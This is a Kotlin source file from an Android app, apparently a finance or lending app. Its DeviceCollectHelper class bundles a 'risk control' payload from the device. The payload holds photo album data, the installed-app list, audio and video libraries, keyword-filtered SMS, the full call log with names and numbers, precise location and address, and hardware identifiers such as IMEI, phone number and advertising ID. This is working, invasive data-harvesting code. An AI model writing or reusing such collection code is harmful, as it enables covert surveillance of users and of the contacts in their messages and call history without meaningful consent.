package com.vaycore.finance.util.runtime

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.provider.CallLog
import androidx.core.app.ActivityCompat
import com.vaycore.finance.BuildConfig
import com.vaycore.finance.App
import com.vaycore.finance.data.local.APPCODE
import com.vaycore.finance.data.local.gaId
import com.vaycore.finance.util.encodeBase64
import com.vaycore.finance.util.formatDateString
import kotlinx.coroutines.*
import org.json.JSONObject

class DeviceCollectHelper private constructor() {
    companion object {

        @Volatile
        private var instance: DeviceCollectHelper? = null

        fun getInstance(): DeviceCollectHelper {
            return instance ?: synchronized(this) {
                instance ?: DeviceCollectHelper().also { instance = it }
            }
        }
    }

    /** Generate risk control JSON */
    suspend fun getRiskBy2Json(): String = withContext(Dispatchers.IO) {

        supervisorScope {

            val albumInfo = safeAsync { MediaLibraryReader.getImages().toString() }
            val albumUpdateTime = safeAsync { getPhotoAlbumUpdateTime() }

            val appInfo = safeAsync { DeviceSignalReader.getAppListData().toString() }
            val audioInfo = safeAsync { MediaLibraryReader.getAudioInfo().toString() }

            val bluetoothInfo = safeAsync { DeviceSignalReader.getBluetoothInfo().toString() }
            val hardwareInfo = safeAsync { getHardwareInfo() }

            val locationInfo = safeAsync { getLocationInfo().toString() }
            val networkInfo = safeAsync { DeviceSignalReader.getNetworkInfo().toString() }

            val simCardInfo = safeAsync { DeviceSignalReader.getSimCardInfo().toString() }
            val smsInfo = safeAsync { SmsInfoHelper.getSmsInfosByKeywords().toString() }

            val systemInfo = safeAsync { SystemInfoHelper.getSystemInfoJson().toString() }
            val videoInfo = safeAsync { MediaLibraryReader.getVideoInfo().toString() }

            JSONObject().apply {

                put("albumInfo", albumInfo.await())
                put("albumUpdateTime", albumUpdateTime.await())

                put("appInfo", appInfo.await())
                put("appInstallInfo", "[]")

                put("audioInfo", audioInfo.await())
                put(
                    "bluetoothInfo",
                    bluetoothInfo.await() ?: DeviceSignalReader.getDefaultBluetoothInfo().toString()
                )

                put("hardwareInfo", hardwareInfo.await())

                put("locationInfo", locationInfo.await())
                put("networkInfo", networkInfo.await())

                put("simCardInfo", simCardInfo.await())
                put("smsInfo", smsInfo.await())

                put("systemInfo", systemInfo.await())
                put("videoInfo", videoInfo.await())
                put("userCommunicationRecordStr", getCallLog().encodeBase64())

                put("mobileType", "2")
                put("appCode", APPCODE)
                put("version", BuildConfig.VERSION_NAME)

            }.toString()
        }
    }

    /** Prevent single task from crashing */
    private fun <T> CoroutineScope.safeAsync(
        block: suspend () -> T
    ): Deferred<T?> {
        return async {
            runCatching {
                block()
            }.getOrNull()
        }
    }

    /** Get hardware info */
    private fun getHardwareInfo(): JSONObject {
        val json = JSONObject()

        runCatching {

            val installTime = DeviceSignalReader.getCurrentAppInstalledTime()

            json.put("androidId", DeviceHelper.getAndroidID())
            json.put("deviceCode", DeviceHelper.getDeviceId())
            json.put("googleAdId", gaId)
            json.put("imei", DeviceHelper.getDeviceId())

            json.put("mac", DeviceHelper.getMcc())
            json.put("phoneNo", DeviceHelper.getPhoneNumber() ?: "")

            json.put("serialNo", DeviceHelper.getSerialNumbers())
            json.put("systemVersion", Build.VERSION.SDK_INT.toString())

            json.put(
                "appInstallTime",
                if (installTime < 0) "-1"
                else (installTime / 1000).toString()
            )
            val totalRam = DeviceHelper.getTotalMemory() / 1073741824.0 // convert to GB
            val usableRam = DeviceHelper.getAvailMemory() / 1073741824.0

            // get internal storage info
            val totalInternal = DeviceHelper.getInternalTotalSize() / 1073741824.0
            val usableInternal = DeviceHelper.getInternalAvailableSize() / 1073741824.0

            json.put("totalRam", totalRam)
            json.put("usableRam", usableRam)
            json.put("totalSdCard", totalInternal)
            json.put("usableSdCard", usableInternal)
        }

        return json
    }

    /** Location */
    private suspend fun getLocationInfo(): JSONObject = withContext(Dispatchers.IO) {
        val json = JSONObject()
        runCatching {
            val (location, address) = LocationInfoHelper.getLocationInfo()

            json.put("province", address?.adminArea)
            json.put("city", address?.locality)
            json.put("street", address?.thoroughfare)
            json.put("addressText", address?.getAddressLine(0))
            json.put("longitude", location?.longitude ?: 0.0)
            json.put("latitude", location?.latitude ?: 0.0)
        }
        json
    }

    /** Photo album update time */
    private fun getPhotoAlbumUpdateTime(): Long {

        return runCatching {

            val updateTime =
                MediaLibraryReader.getLatestImageUpdateTime()

            if (updateTime <= 0) -1L else updateTime

        }.getOrDefault(-1L)
    }

    fun getCallLog(): String {
        if (ActivityCompat.checkSelfPermission(
                App.appContext,
                Manifest.permission.READ_CALL_LOG
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return "[]"
        }

        val jsonArray = org.json.JSONArray()
        val callLogUri = CallLog.Calls.CONTENT_URI

        val projection = arrayOf(
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE
        )

        val cursor = App.appContext.contentResolver.query(
            callLogUri,
            projection,
            null,
            null,
            "date DESC"
        )

        cursor?.use { c ->
            val nameIndex = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val numberIndex = c.getColumnIndex(CallLog.Calls.NUMBER)
            val dateIndex = c.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = c.getColumnIndex(CallLog.Calls.DURATION)
            val typeIndex = c.getColumnIndex(CallLog.Calls.TYPE)

            while (c.moveToNext()) {

                val json = org.json.JSONObject()
                json.put("name", c.getString(nameIndex))
                json.put("phone", c.getString(numberIndex))
                json.put("callType", c.getInt(typeIndex))
                json.put(
                    "lastCallTime",
                    c.getLong(dateIndex).formatDateString("yyyy-MM-dd HH:mm:ss")
                )
                json.put("callTime", c.getInt(durationIndex))

                jsonArray.put(json)
            }
        }

        return jsonArray.toString()
    }
}
